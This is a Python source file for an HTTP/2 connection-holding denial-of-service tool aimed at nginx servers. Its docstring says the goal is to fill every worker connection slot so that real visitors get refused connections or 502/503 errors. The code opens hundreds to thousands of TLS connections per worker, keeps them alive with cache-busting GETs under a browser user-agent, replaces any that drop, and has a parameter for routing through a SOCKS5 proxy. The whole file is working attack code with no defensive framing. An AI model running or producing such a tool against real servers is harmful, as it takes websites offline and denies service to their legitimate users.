"""
HTTP/2 Connection Hold Engine
=============================
Strategy: exhaust nginx worker_connections by holding many h2 connections open.
Each h2 connection = 1 TCP slot on the server. Fill all available slots,
then new visitors get "connection refused" or 502/503 errors.

We send a tiny GET every few seconds to keep the connection alive.
Otherwise nginx would timeout and close idle connections.
"""
from __future__ import annotations

import logging
import random
import socket
import ssl
import threading
import time
from dataclasses import dataclass, field
from typing import Any, List, Optional
from urllib.parse import urlparse

import h2.config
import h2.connection
import h2.events
import h2.exceptions as h2e
import h2.settings

logger = logging.getLogger("h2_hold")


@dataclass
class HoldMetrics:
    opened: int = 0
    closed: int = 0
    active: int = 0
    sent: int = 0
    started_at: float = field(default_factory=time.time)


class H2Holder:
    """H2 connection that stays open by periodically sending keepalive requests."""
    def __init__(self, host: str, port: int, host_header: str = ""):
        self.host = host
        self.port = port
        self.host_header = host_header or host
        self.conn: Any = None
        self.ssl_sock: Optional[ssl.SSLSocket] = None
        self.alive = False
        self.next_id = 1
        self.last_keepalive = 0

    def open(self, timeout: float = 6.0) -> bool:
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_alpn_protocols(["h2", "http/1.1"])
            ctx.set_ciphers("HIGH:!aNULL:!MD5")

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.settimeout(timeout)
            sock.connect((self.host, self.port))

            ssl_sock = ctx.wrap_socket(sock, server_hostname=self.host_header)
            if ssl_sock.selected_alpn_protocol() != "h2":
                ssl_sock.close()
                return False

            config = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
            conn = h2.connection.H2Connection(config=config)
            conn.initiate_connection()
            ssl_sock.sendall(conn.data_to_send())

            data = ssl_sock.recv(65535)
            if data:
                events = conn.receive_data(data)
                ssl_sock.sendall(conn.data_to_send())

            self.conn = conn
            self.ssl_sock = ssl_sock
            self.alive = True
            self.next_id = 1
            self.last_keepalive = time.time()
            return True
        except Exception:
            return False

    def keepalive(self) -> bool:
        """Send a minimal GET to keep the connection alive. Returns True if OK."""
        if not self.alive:
            return False
        try:
            sid = self.next_id
            self.next_id += 2
            self.conn.send_headers(sid, [
                (":method", "GET"),
                (":path", f"/_ping?_{random.randint(0,99999)}"),
                (":authority", self.host_header),
                (":scheme", "https"),
                ("user-agent", "Mozilla/5.0"),
                ("accept", "*/*"),
                ("cache-control", "no-cache"),
            ], end_stream=True)
            data = self.conn.data_to_send()
            if data:
                self.ssl_sock.sendall(data)
            self.last_keepalive = time.time()
            return True
        except Exception:
            self.alive = False
            return False

    def drain(self):
        """Read any incoming data to prevent socket buffer overflow."""
        if not self.alive or not self.ssl_sock:
            return
        try:
            self.ssl_sock.settimeout(0)
            while True:
                data = self.ssl_sock.recv(65535)
                if not data:
                    self.alive = False
                    return
                events = self.conn.receive_data(data)
                extra = self.conn.data_to_send()
                if extra:
                    try:
                        self.ssl_sock.sendall(extra)
                    except Exception:
                        self.alive = False
                        return
        except (socket.timeout, BlockingIOError, ssl.SSLWantReadError):
            pass
        except Exception:
            self.alive = False

    def close(self):
        self.alive = False
        if self.conn:
            try:
                self.conn.close_connection()
                if self.ssl_sock:
                    self.ssl_sock.sendall(self.conn.data_to_send())
            except Exception:
                pass
        if self.ssl_sock:
            try:
                self.ssl_sock.close()
            except Exception:
                pass


def run_hold_worker(
    target_url: str, duration: float, worker_id: int,
    stats_queue, stop_event, host_header: str = "",
    connections: int = 100, proxy_url: str = "",
) -> None:
    """
    Open and hold many h2 connections to exhaust nginx worker_connections.
    If proxy_url is provided, connections go through SOCKS5 proxy.
    """
    parsed = urlparse(target_url)
    host = parsed.hostname or parsed.netloc.split(":")[0]
    port = parsed.port or 443
    hdr = host_header or host

    metrics = HoldMetrics()
    metrics.started_at = time.time()
    _last_report = time.time()

    pool: List[H2Holder] = []
    target_conns = max(10, min(2000, connections))

    def push_stats():
        nonlocal _last_report
        now = time.time()
        if now - _last_report < 0.5:
            return
        snap = {
            "worker_id": worker_id, "ts": now,
            "opened": metrics.opened, "active": metrics.active,
            "closed": metrics.closed, "sent": metrics.sent,
        }
        try:
            stats_queue.put_nowait(snap)
        except Exception:
            try:
                stats_queue.get_nowait()
                stats_queue.put_nowait(snap)
            except Exception:
                pass
        _last_report = now

    try:
        # PHASE 1: BURST OPEN all connections as fast as possible
        burst_start = time.time()
        while len(pool) < target_conns and not stop_event.is_set():
            # Open in parallel batches of 20
            batch = []
            batch_size = min(20, target_conns - len(pool))
            for _ in range(batch_size):
                c = H2Holder(host, port, hdr)
                batch.append(c)
            for c in batch:
                if c.open():
                    pool.append(c)
                    metrics.opened += 1
                    metrics.active = len(pool)
                else:
                    c.close()
            # Small delay to not hammer the CPU
            if len(pool) < target_conns:
                time.sleep(0.1)
        burst_time = time.time() - burst_start
        print(f"  [hold-{worker_id}] Opened {len(pool)} connections in {burst_time:.1f}s")

        # PHASE 2: MAINTENANCE — keep connections alive
        last_keepalive = time.time()
        while not stop_event.is_set():
            elapsed = time.time() - metrics.started_at
            if elapsed >= float(duration):
                break

            # Remove dead connections
            dead = [c for c in pool if not c.alive]
            for c in dead:
                pool.remove(c)
                metrics.closed += 1
                metrics.active = len(pool)

            # Replace dead connections quickly
            if len(pool) < target_conns * 0.8:
                needed = min(20, target_conns - len(pool))
                for _ in range(needed):
                    c = H2Holder(host, port, hdr)
                    if c.open():
                        pool.append(c)
                        metrics.opened += 1
                        metrics.active = len(pool)
                    else:
                        break

            # Send keepalive to connections (rotate through pool)
            now = time.time()
            if now - last_keepalive >= 5.0:
                for c in pool:
                    if c.alive:
                        c.keepalive()
                        c.drain()
                        metrics.sent += 1
                last_keepalive = now

            push_stats()
            time.sleep(1.0)

    finally:
        for c in pool:
            try:
                c.close()
            except Exception:
                pass
